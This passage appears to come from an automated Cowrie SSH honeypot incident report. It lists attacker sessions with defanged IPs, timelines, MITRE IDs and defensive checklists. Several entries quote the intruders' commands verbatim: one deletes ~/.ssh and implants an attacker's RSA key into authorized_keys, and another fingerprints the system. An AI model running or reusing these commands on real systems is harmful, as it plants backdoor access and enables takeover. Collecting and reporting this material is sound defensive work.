| `2026-08-09 11:42:08` | `cowrie.login.success` |
| `2026-08-09 11:42:09` | `cowrie.session.params` |
| `2026-08-09 11:42:09` | `cowrie.command.input` |
| `2026-08-09 11:42:09` | `cowrie.command.failed` |
| `2026-08-09 11:42:09` | `cowrie.log.closed` |
| `2026-08-09 11:42:10` | `cowrie.session.params` |
| `2026-08-09 11:42:10` | `cowrie.command.input` |
| `2026-08-09 11:42:10` | `cowrie.session.file_download` |
| `2026-08-09 11:42:10` | `cowrie.log.closed` |
| `2026-08-09 11:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b387b2c8db93

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-08-09 11:42 |
| **Last Seen** | 2026-08-09 11:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:42:10` | `cowrie.session.connect` |
| `2026-08-09 11:42:10` | `cowrie.client.version` |
| `2026-08-09 11:42:10` | `cowrie.client.kex` |
| `2026-08-09 11:42:10` | `cowrie.login.success` |
| `2026-08-09 11:42:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7802ea8a015

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-08-09 11:42 |
| **Last Seen** | 2026-08-09 11:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:42:10` | `cowrie.session.connect` |
| `2026-08-09 11:42:10` | `cowrie.client.version` |
| `2026-08-09 11:42:11` | `cowrie.client.kex` |
| `2026-08-09 11:42:11` | `cowrie.login.success` |
| `2026-08-09 11:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f36a894733

| Field | Detail |
|---|---|
| **Source IP** | `115.178.75[.]243` |
| **First Seen** | 2026-08-09 11:43 |
| **Last Seen** | 2026-08-09 11:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:43:03` | `cowrie.session.connect` |
| `2026-08-09 11:43:03` | `cowrie.client.version` |
| `2026-08-09 11:43:03` | `cowrie.client.kex` |
| `2026-08-09 11:43:04` | `cowrie.login.success` |
| `2026-08-09 11:43:05` | `cowrie.session.params` |
| `2026-08-09 11:43:05` | `cowrie.command.input` |
| `2026-08-09 11:43:05` | `cowrie.command.failed` |
| `2026-08-09 11:43:05` | `cowrie.log.closed` |
| `2026-08-09 11:43:06` | `cowrie.session.params` |
| `2026-08-09 11:43:06` | `cowrie.command.input` |
| `2026-08-09 11:43:06` | `cowrie.session.file_download` |
| `2026-08-09 11:43:06` | `cowrie.log.closed` |
| `2026-08-09 11:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.178.75[.]243` to AbuseIPDB if not already reported
- [ ] Block `115.178.75[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5947c826c7f0

| Field | Detail |
|---|---|
| **Source IP** | `115.178.75[.]243` |
| **First Seen** | 2026-08-09 11:43 |
| **Last Seen** | 2026-08-09 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:43:07` | `cowrie.session.connect` |
| `2026-08-09 11:43:07` | `cowrie.client.version` |
| `2026-08-09 11:43:07` | `cowrie.client.kex` |
| `2026-08-09 11:43:07` | `cowrie.login.success` |
| `2026-08-09 11:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.178.75[.]243` to AbuseIPDB if not already reported
- [ ] Block `115.178.75[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6113aa530c86

| Field | Detail |
|---|---|
| **Source IP** | `115.178.75[.]243` |
| **First Seen** | 2026-08-09 11:43 |
| **Last Seen** | 2026-08-09 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:43:08` | `cowrie.session.connect` |
| `2026-08-09 11:43:08` | `cowrie.client.version` |
| `2026-08-09 11:43:08` | `cowrie.client.kex` |
| `2026-08-09 11:43:09` | `cowrie.login.success` |
| `2026-08-09 11:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.178.75[.]243` to AbuseIPDB if not already reported
- [ ] Block `115.178.75[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc41c1326fe1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:43 |
| **Last Seen** | 2026-08-09 11:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:43:12` | `cowrie.session.connect` |
| `2026-08-09 11:43:12` | `cowrie.client.version` |
| `2026-08-09 11:43:12` | `cowrie.client.kex` |
| `2026-08-09 11:43:16` | `cowrie.login.success` |
| `2026-08-09 11:43:17` | `cowrie.session.params` |
| `2026-08-09 11:43:17` | `cowrie.command.input` |
| `2026-08-09 11:43:17` | `cowrie.command.input` |
| `2026-08-09 11:43:17` | `cowrie.command.input` |
| `2026-08-09 11:43:17` | `cowrie.command.input` |
| `2026-08-09 11:43:17` | `cowrie.command.input` |
| `2026-08-09 11:43:17` | `cowrie.command.success` |
| `2026-08-09 11:43:17` | `cowrie.command.input` |
| `2026-08-09 11:43:17` | `cowrie.command.input` |
| `2026-08-09 11:43:17` | `cowrie.command.input` |
| `2026-08-09 11:43:17` | `cowrie.command.input` |
| `2026-08-09 11:43:18` | `cowrie.log.closed` |
| `2026-08-09 11:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c110bd419f9

| Field | Detail |
|---|---|
| **Source IP** | `102.140.97[.]134` |
| **First Seen** | 2026-08-09 11:44 |
| **Last Seen** | 2026-08-09 11:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:44:42` | `cowrie.session.connect` |
| `2026-08-09 11:44:42` | `cowrie.client.version` |
| `2026-08-09 11:44:42` | `cowrie.client.kex` |
| `2026-08-09 11:44:43` | `cowrie.login.success` |
| `2026-08-09 11:44:43` | `cowrie.session.params` |
| `2026-08-09 11:44:43` | `cowrie.command.input` |
| `2026-08-09 11:44:43` | `cowrie.command.failed` |
| `2026-08-09 11:44:44` | `cowrie.log.closed` |
| `2026-08-09 11:44:45` | `cowrie.session.params` |
| `2026-08-09 11:44:45` | `cowrie.command.input` |
| `2026-08-09 11:44:45` | `cowrie.session.file_download` |
| `2026-08-09 11:44:45` | `cowrie.log.closed` |
| `2026-08-09 11:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.140.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `102.140.97[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06cb19232e77

| Field | Detail |
|---|---|
| **Source IP** | `102.140.97[.]134` |
| **First Seen** | 2026-08-09 11:44 |
| **Last Seen** | 2026-08-09 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:44:45` | `cowrie.session.connect` |
| `2026-08-09 11:44:45` | `cowrie.client.version` |
| `2026-08-09 11:44:45` | `cowrie.client.kex` |
| `2026-08-09 11:44:46` | `cowrie.login.success` |
| `2026-08-09 11:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.140.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `102.140.97[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d50513d54393

| Field | Detail |
|---|---|
| **Source IP** | `102.140.97[.]134` |
| **First Seen** | 2026-08-09 11:44 |
| **Last Seen** | 2026-08-09 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:44:46` | `cowrie.session.connect` |
| `2026-08-09 11:44:46` | `cowrie.client.version` |
| `2026-08-09 11:44:47` | `cowrie.client.kex` |
| `2026-08-09 11:44:47` | `cowrie.login.success` |
| `2026-08-09 11:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.140.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `102.140.97[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20215725d15d

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-08-09 11:45 |
| **Last Seen** | 2026-08-09 11:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:45:51` | `cowrie.session.connect` |
| `2026-08-09 11:45:51` | `cowrie.client.version` |
| `2026-08-09 11:45:51` | `cowrie.client.kex` |
| `2026-08-09 11:45:52` | `cowrie.login.success` |
| `2026-08-09 11:45:53` | `cowrie.session.params` |
| `2026-08-09 11:45:53` | `cowrie.command.input` |
| `2026-08-09 11:45:53` | `cowrie.command.failed` |
| `2026-08-09 11:45:53` | `cowrie.log.closed` |
| `2026-08-09 11:45:54` | `cowrie.session.params` |
| `2026-08-09 11:45:54` | `cowrie.command.input` |
| `2026-08-09 11:45:54` | `cowrie.session.file_download` |
| `2026-08-09 11:45:54` | `cowrie.log.closed` |
| `2026-08-09 11:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecef6719e255

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-08-09 11:45 |
| **Last Seen** | 2026-08-09 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:45:54` | `cowrie.session.connect` |
| `2026-08-09 11:45:54` | `cowrie.client.version` |
| `2026-08-09 11:45:55` | `cowrie.client.kex` |
| `2026-08-09 11:45:55` | `cowrie.login.success` |
| `2026-08-09 11:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61fce1630d0f

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-08-09 11:45 |
| **Last Seen** | 2026-08-09 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:45:56` | `cowrie.session.connect` |
| `2026-08-09 11:45:56` | `cowrie.client.version` |
| `2026-08-09 11:45:56` | `cowrie.client.kex` |
| `2026-08-09 11:45:57` | `cowrie.login.success` |
| `2026-08-09 11:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78a624edd5a5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:46 |
| **Last Seen** | 2026-08-09 11:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:46:13` | `cowrie.session.connect` |
| `2026-08-09 11:46:16` | `cowrie.client.version` |
| `2026-08-09 11:46:16` | `cowrie.client.kex` |
| `2026-08-09 11:46:19` | `cowrie.login.success` |
| `2026-08-09 11:46:20` | `cowrie.session.params` |
| `2026-08-09 11:46:20` | `cowrie.command.input` |
| `2026-08-09 11:46:20` | `cowrie.command.input` |
| `2026-08-09 11:46:20` | `cowrie.command.input` |
| `2026-08-09 11:46:20` | `cowrie.command.input` |
| `2026-08-09 11:46:20` | `cowrie.command.input` |
| `2026-08-09 11:46:20` | `cowrie.command.success` |
| `2026-08-09 11:46:20` | `cowrie.command.input` |
| `2026-08-09 11:46:20` | `cowrie.command.input` |
| `2026-08-09 11:46:20` | `cowrie.command.input` |
| `2026-08-09 11:46:20` | `cowrie.command.input` |
| `2026-08-09 11:46:20` | `cowrie.log.closed` |
| `2026-08-09 11:46:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b07d776acc29

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:49 |
| **Last Seen** | 2026-08-09 11:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:49:16` | `cowrie.session.connect` |
| `2026-08-09 11:49:18` | `cowrie.client.version` |
| `2026-08-09 11:49:18` | `cowrie.client.kex` |
| `2026-08-09 11:49:21` | `cowrie.login.success` |
| `2026-08-09 11:49:23` | `cowrie.session.params` |
| `2026-08-09 11:49:23` | `cowrie.command.input` |
| `2026-08-09 11:49:23` | `cowrie.command.input` |
| `2026-08-09 11:49:23` | `cowrie.command.input` |
| `2026-08-09 11:49:23` | `cowrie.command.input` |
| `2026-08-09 11:49:23` | `cowrie.command.input` |
| `2026-08-09 11:49:23` | `cowrie.command.success` |
| `2026-08-09 11:49:23` | `cowrie.command.input` |
| `2026-08-09 11:49:23` | `cowrie.command.input` |
| `2026-08-09 11:49:23` | `cowrie.command.input` |
| `2026-08-09 11:49:23` | `cowrie.command.input` |
| `2026-08-09 11:49:23` | `cowrie.log.closed` |
| `2026-08-09 11:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adf0c209e97c

| Field | Detail |
|---|---|
| **Source IP** | `221.120.57[.]125` |
| **First Seen** | 2026-08-09 11:55 |
| **Last Seen** | 2026-08-09 11:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:55:00` | `cowrie.session.connect` |
| `2026-08-09 11:55:01` | `cowrie.client.version` |
| `2026-08-09 11:55:01` | `cowrie.client.kex` |
| `2026-08-09 11:55:03` | `cowrie.login.success` |
| `2026-08-09 11:55:03` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.57[.]125` to AbuseIPDB if not already reported
- [ ] Block `221.120.57[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b591c90c5dd

| Field | Detail |
|---|---|
| **Source IP** | `41.220.3[.]101` |
| **First Seen** | 2026-08-09 11:55 |
| **Last Seen** | 2026-08-09 11:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:55:13` | `cowrie.session.connect` |
| `2026-08-09 11:55:14` | `cowrie.client.version` |
| `2026-08-09 11:55:14` | `cowrie.client.kex` |
| `2026-08-09 11:55:16` | `cowrie.login.success` |
| `2026-08-09 11:55:17` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.220.3[.]101` to AbuseIPDB if not already reported
- [ ] Block `41.220.3[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57185dcb9754

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-09 12:01 |
| **Last Seen** | 2026-08-09 12:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:01:43` | `cowrie.session.connect` |
| `2026-08-09 12:01:43` | `cowrie.client.version` |
| `2026-08-09 12:01:44` | `cowrie.client.kex` |
| `2026-08-09 12:01:44` | `cowrie.login.success` |
| `2026-08-09 12:01:44` | `cowrie.direct-tcpip.request` |
| `2026-08-09 12:01:44` | `cowrie.direct-tcpip.data` |
| `2026-08-09 12:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff4ad3441e3

| Field | Detail |
|---|---|
| **Source IP** | `196.190.41[.]137` |
| **First Seen** | 2026-08-09 12:11 |
| **Last Seen** | 2026-08-09 12:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:11:46` | `cowrie.session.connect` |
| `2026-08-09 12:11:47` | `cowrie.client.version` |
| `2026-08-09 12:11:47` | `cowrie.client.kex` |
| `2026-08-09 12:11:48` | `cowrie.login.success` |
| `2026-08-09 12:11:49` | `cowrie.direct-tcpip.request` |
| `2026-08-09 12:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.41[.]137` to AbuseIPDB if not already reported
- [ ] Block `196.190.41[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47cda5b0f753

| Field | Detail |
|---|---|
| **Source IP** | `212.73.75[.]82` |
| **First Seen** | 2026-08-09 12:23 |
| **Last Seen** | 2026-08-09 12:28 |
| **Session Duration** | 306s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:23:19` | `cowrie.session.connect` |
| `2026-08-09 12:23:20` | `cowrie.client.version` |
| `2026-08-09 12:23:20` | `cowrie.client.kex` |
| `2026-08-09 12:23:25` | `cowrie.login.success` |
| `2026-08-09 12:23:25` | `cowrie.direct-tcpip.request` |
| `2026-08-09 12:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.73.75[.]82` to AbuseIPDB if not already reported
- [ ] Block `212.73.75[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5e0b6dd20cc

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-08-09 12:23 |
| **Last Seen** | 2026-08-09 12:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:23:30` | `cowrie.session.connect` |
| `2026-08-09 12:23:30` | `cowrie.client.version` |
| `2026-08-09 12:23:30` | `cowrie.client.kex` |
